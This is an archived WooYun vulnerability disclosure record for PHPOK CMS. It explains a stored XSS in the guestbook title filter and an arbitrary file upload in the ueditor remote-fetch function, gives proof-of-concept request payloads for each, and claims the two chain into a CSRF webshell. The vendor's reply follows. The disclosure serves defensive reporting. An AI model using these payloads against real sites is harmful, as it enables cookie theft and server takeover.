{"id": 51289, "wybug_id": "wooyun-2014-075085", "wybug_title": "PHPOK  最新版CSRF getshell", "wybug_corp": "phpok.com", "wybug_author": "路人甲", "wybug_date": "2014-09-09 11:57", "wybug_open_date": "2014-12-08 11:58", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向公众公开  简要描述： 过滤不严格 详细说明：  漏洞细节：漏洞一：存储型XSS 漏洞文件：framework/api/post_control.php(94行）$array[\"title\"] = $this->get(\"title\");....$this->model('list')->save($array,$tid);这里是保存用户留言内容的部分操作。$array[\"title\"] 是获取的客户输入的主题再来看获取过程中的过滤:  （framework/init.php 第829行）        //通过post或get取得数据，并格式化成自己需要的function get($id,$type=\"safe\",$ext=\"\"){$val = isset($_POST[$id]) ? $_POST[$id] : (isset($_GET[$id]) ? $_GET[$id] : \"\");if($val == '') return false;//判断内容是否有转义，所有未转义的数据都直接转义$addslashes = false;if(function_exists(\"get_magic_quotes_gpc\") && get_magic_quotes_gpc()) $addslashes = true;if(!$addslashes) $val = $this->_addslashes($val);return $this->format($val,$type,$ext);}function format($msg,$type=\"safe\",$ext=\"\"){....switch ($type){case 'safe':$msg = str_replace(array(\"\\\\\",\"'\",'\"',\"<\",\">\"),array(\"&#92;\",\"&#39;\",\"&quot;\",\"&lt;\",\"&gt;\"),$msg);\tbreak;...}在这里看到 整个过程中只是对title做了一次替换操作（\\,',\",<,>)，并没有涉及到其他的字符。再看输出点(访问地址是:admin.php?c=list&f=action&id=96&_rand=0.5493041966110468   ,需要管理员权限）所以可以利用html编码方式直接绕过。POC漏洞利用：URL：http://192.168.152.160:8080/phpok/api.php?c=post&f=save  POST：id=book&fullname=asd&email=asd&content=asd&_chkcode=ejwh&title=111&#39;);alert(document.cookie);//漏洞本地证明：\n\n\n\n漏洞二：任意文件上传漏洞文件：framework/api/ueditor_control.php（243行）function remote_f(){....$arraylist = array(\"jpg\",\"gif\",\"png\",\"jpeg\");     .......if(strtolower(substr($imgUrl,0,10)) == 'data:image'){。。。}else{if(strpos($imgUrl,\"http\")!==0){array_push( $tmpNames , \"error\" );continue;}$content = $this->lib('html')->get_content($imgUrl);$tmp_title = basename($imgUrl);$new_filename = substr(md5($imgUrl),9,16).\"_\".rand(0,99).\"_\".$key;$fileType = strtolower( strrchr( $imgUrl , '.' ));$ext = substr($fileType,1);if(!$ext) $ext = \"png\";}if(!$content)            {           \t array_push( $tmpNames , \"error\" );                continue;            }            $save_folder = $this->dir_root.$cate_rs['folder'];$newfile = $save_folder.$new_filename.\".\".$ext;$this->lib('file')->save_pic($content,$newfile);从头到尾$ext 没有进行白名单过滤（$arraylist 这个就是白名单）。这样就导致任意文件上传。（需要后台管理权限）POC漏洞利用链接：api.php?c=ueditor&f=remote&upfile=http://192.168.152.160:8080/info.phpupfile的值只要是一个远程地址，后缀为php，输出内容就是shell内容即可。    漏洞本地证明：\n\n\n\n结合两个漏洞可以直接对网站 CSRF  getshell   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  你们比我更专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-09-12 14:23 厂商回复： 您好，感谢您提供如此详情的漏洞说明，目前经测试：1、此漏洞在删除动作时注入信息，已收到，将在下周更新发布时修正！2、我们经测试，觉得第二个问题是由于第一个漏洞造成的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-08 15:16 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  水印上咋还有360裤带计划    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}